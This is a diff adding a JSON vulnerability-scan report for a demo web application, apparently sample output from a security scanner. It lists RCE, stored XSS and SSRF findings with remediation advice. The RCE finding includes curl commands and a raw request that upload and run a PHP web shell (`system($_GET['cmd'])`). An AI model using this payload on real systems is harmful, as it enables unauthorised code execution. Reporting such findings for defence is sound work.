@@ -1,0 +1,63 @@
+{
+  "schema_version": "1.0",
+  "tool": "darkmoon",
+  "scan": {
+    "target": "https://demo.darkmoon.example.com",
+    "started_at": "2026-09-30T10:12:04Z",
+    "finished_at": "2026-09-30T10:41:37Z",
+    "campaign_id": "cmp-7f3a9c21"
+  },
+  "findings": [
+    {
+      "title": "Unauthenticated remote code execution in file upload handler",
+      "severity": "critical",
+      "cvss_score": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "category": "remote_code_execution",
+      "status": "exploited",
+      "description": "The /upload endpoint accepts a crafted multipart payload whose filename is written to disk without sanitisation, allowing a PHP web shell to be dropped and executed.",
+      "endpoint": "https://demo.darkmoon.example.com/upload",
+      "discovered_by_agent": "php",
+      "remediation": "Validate and normalise the uploaded filename, store uploads outside the web root, and disable script execution in the upload directory.",
+      "evidence_commands": [
+        "curl -s -F 'file=@shell.php;filename=shell.php' https://demo.darkmoon.example.com/upload",
+        "curl -s https://demo.darkmoon.example.com/uploads/shell.php?cmd=id"
+      ],
+      "evidence_logs": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+      "evidence_explanation": "Uploaded a PHP web shell and executed `id` to confirm code execution as www-data.",
+      "cve": "CVE-2026-12345",
+      "mitre_attack_id": "T1190",
+      "mitre_attack_name": "Exploit Public-Facing Application",
+      "iso27001_control": "A.8.26",
+      "node_id": "finding-0001",
+      "plugin_or_component": "upload-handler",
+      "raw_request": "POST /upload HTTP/1.1\nHost: demo.darkmoon.example.com\nContent-Type: multipart/form-data; boundary=x\n\n--x\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\n\n<?php system($_GET['cmd']); ?>\n--x--",
+      "raw_response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"stored\":\"/uploads/shell.php\"}"
+    },
+    {
+      "title": "Stored cross-site scripting in profile display name",
+      "severity": "high",
+      "cvss_score": 8.2,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N",
+      "category": "xss_stored",
+      "status": "confirmed",
+      "description": "The display name field is rendered without output encoding on the public profile page, allowing stored JavaScript to run in the context of any visitor.",
+      "endpoint": "https://demo.darkmoon.example.com/profile/42",
+      "discovered_by_agent": "nodejs",
+      "remediation": "HTML-encode user-controlled values on output and apply a strict Content-Security-Policy.",
+      "evidence_explanation": "Set the display name to a script payload and observed it execute when loading another user's view of the profile.",
+      "node_id": "finding-0002",
+      "plugin_or_component": "profile-renderer"
+    },
+    {
+      "title": "Server-side request forgery in URL preview feature",
+      "severity": "medium",
+      "cvss_score": 6.5,
+      "category": "ssrf",
+      "status": "unconfirmed",
+      "description": "The link preview service fetches arbitrary user-supplied URLs server-side; internal metadata endpoints may be reachable.",
+      "endpoint": "https://demo.darkmoon.example.com/api/preview",
+      "discovered_by_agent": "nodejs"
+    }
+  ]
+}
